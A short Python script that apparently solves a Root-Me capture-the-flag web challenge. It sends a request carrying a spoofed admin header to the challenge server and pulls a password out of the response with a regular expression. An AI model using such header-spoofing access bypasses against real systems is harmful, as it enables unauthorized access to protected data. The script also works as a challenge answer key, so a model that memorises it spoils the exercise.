import requests 
import re

headers = {"Header-RootMe-Admin":"admin"}
result = requests.get('http://challenge01.root-me.org/web-serveur/ch5/',headers=headers)
print(re.findall("password (.*)</p>",result.text)[0])